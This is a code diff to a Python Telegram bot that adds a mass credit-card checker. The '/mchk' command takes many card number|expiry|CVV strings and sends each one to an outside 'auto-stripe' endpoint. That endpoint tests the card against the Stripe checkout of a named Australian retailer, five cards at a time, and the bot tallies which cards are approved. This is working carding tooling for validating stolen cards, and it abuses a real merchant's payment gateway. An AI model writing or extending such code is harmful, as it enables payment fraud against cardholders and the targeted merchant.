@@ -1613,33 +1613,83 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 
+import asyncio
 import aiohttp
+import time
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 
 API_URL_TEMPLATE = "https://darkboy-auto-stripe-y6qk.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc="
+CONCURRENCY = 5
+UPDATE_INTERVAL = 3  # seconds
+
+async def check_card(session, card):
+    try:
+        async with session.get(API_URL_TEMPLATE + card) as resp:
+            data = await resp.json()
+        status = data.get("status", "Unknown")
+        if status.lower() == "approved":
+            return f"`{card}`\n***{status} ✅***", "approved"
+        else:
+            return f"`{card}`\n**{status} ❌**", "declined"
+    except:
+        return f"`{card}`\n**Error ❌**", "error"
 
 async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.args:
-        await update.message.reply_text("Usage: /mchk card|mm|yy|cvv")
+        await update.message.reply_text("Usage: /mchk card1|mm|yy|cvv card2|mm|yy|cvv ...")
         return
 
-    card_input = context.args[0]  # The full card string
+    cards = context.args
+    total = len(cards)
+    results = ["Pending..."] * total
+    counters = {"checked": 0, "approved": 0, "declined": 0, "error": 0}
+    start_time = time.time()
 
-    # Send to API
+    msg = await update.message.reply_text("Starting mass check...", parse_mode="MarkdownV2")
+
+    semaphore = asyncio.Semaphore(CONCURRENCY)
+
     async with aiohttp.ClientSession() as session:
-        async with session.get(API_URL_TEMPLATE + card_input) as resp:
-            if resp.status != 200:
-                await update.message.reply_text("API request failed!")
-                return
-            data = await resp.json()
 
-    # Format the reply
-    card_text = f"`{card_input}`"  # monospace
-    status = data.get("status", "Unknown")
-    status_text = f"***{status}***"  # bold italic
+        async def worker(idx, card):
+            async with semaphore:
+                result_text, status = await check_card(session, card)
+                results[idx] = result_text
+                counters["checked"] += 1
+                if status in counters:
+                    counters[status] += 1
 
-    await update.message.reply_text(f"{card_text}\n{status_text}", parse_mode="MarkdownV2")
+        tasks = [worker(i, c) for i, c in enumerate(cards)]
+
+        pending = tasks
+        while pending:
+            done, pending = await asyncio.wait(pending, timeout=UPDATE_INTERVAL, return_when=asyncio.FIRST_COMPLETED)
+            elapsed = round(time.time() - start_time, 2)
+            header = (
+                f"✘ 𝐓𝐨𝐭𝐚𝐥↣{total}\n"
+                f"✘ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝↣{counters['checked']}\n"
+                f"✘ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝↣{counters['approved']}\n"
+                f"✘ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣{counters['declined']}\n"
+                f"✘ 𝐄𝐫𝐫𝐨𝐫↣{counters['error']}\n"
+                f"✘ 𝐓𝐢𝐦𝐞↣{elapsed}s\n──────── ⸙ ─────────\n"
+            )
+            await msg.edit_text(header + "\n──────── ⸙ ─────────\n".join(results), parse_mode="MarkdownV2")
+
+        # Final update after all tasks complete
+        elapsed = round(time.time() - start_time, 2)
+        header = (
+            f"✘ 𝐓𝐨𝐭𝐚𝐥↣{total}\n"
+            f"✘ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝↣{counters['checked']}\n"
+            f"✘ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝↣{counters['approved']}\n"
+            f"✘ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣{counters['declined']}\n"
+            f"✘ 𝐄𝐫𝐫𝐨𝐫↣{counters['error']}\n"
+            f"✘ 𝐓𝐢𝐦𝐞↣{elapsed}s\n──────── ⸙ ─────────\n"
+        )
+        await msg.edit_text(header + "\n──────── ⸙ ─────────\n".join(results), parse_mode="MarkdownV2")
+
+
+
 
 
 
